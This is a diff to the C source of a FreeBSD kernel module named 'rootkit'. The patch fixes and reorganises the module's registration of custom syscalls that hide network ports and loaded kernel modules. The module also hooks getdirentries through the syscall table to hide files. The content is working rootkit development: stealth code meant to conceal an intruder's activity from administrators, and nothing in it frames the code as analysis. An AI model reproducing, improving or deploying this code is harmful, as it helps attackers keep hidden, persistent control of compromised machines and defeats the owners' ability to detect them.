@@ -130,7 +130,7 @@ port_hiding(struct thread *td, void *syscall_args) {
     return 0;
 }
 
-static int port_hiding_offset = 211;
+static int port_hiding_offset = NO_SYSCALL;
 static struct sysent port_hiding_sysent = {
     .sy_narg   = 1,
     .sy_call   = (sy_call_t *) port_hiding,
@@ -168,8 +168,8 @@ kld_hiding(struct thread *td, void *syscall_args) {
         }
     }
     sx_xunlock(&kld_sx);
-    linker_kernel_file->refs--;
-    return 1;
+    free(mod_name, M_TEMP);
+    return 0;
 }
 
 static struct sysent kld_hiding_sysent = {
@@ -179,7 +179,7 @@ static struct sysent kld_hiding_sysent = {
 };
 
 
-static int kld_hiding_offset = 210;
+static int kld_hiding_offset = NO_SYSCALL;
 
 static int load(module_t module, int cmd, void *arg) {
 	(void)module;
@@ -187,14 +187,11 @@ static int load(module_t module, int cmd, void *arg) {
 
 	int error = 0;
 
-  	switch (cmd) {
+    switch (cmd) {
     case MOD_LOAD:
         error = make_rk_dev();
-        SYSCALL_MODULE(kld_hiding, &kld_hiding_offset, &kld_hiding_sysent, load, NULL);
 
         sysent[SYS_getdirentries].sy_call = (sy_call_t *) getdirentries_hook;
-
-        SYSCALL_MODULE(port_hiding, &port_hiding_offset, &port_hiding_sysent, load, NULL);
 
         if (error == 0)
             printf("rootkit: module loaded\n");
@@ -225,3 +222,5 @@ static moduledata_t rootkit_module = {
 };
 
 DECLARE_MODULE(rootkit, rootkit_module, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
+SYSCALL_MODULE(kld_hiding, &kld_hiding_offset, &kld_hiding_sysent, NULL, NULL);
+SYSCALL_MODULE(port_hiding, &port_hiding_offset, &port_hiding_sysent, NULL, NULL);
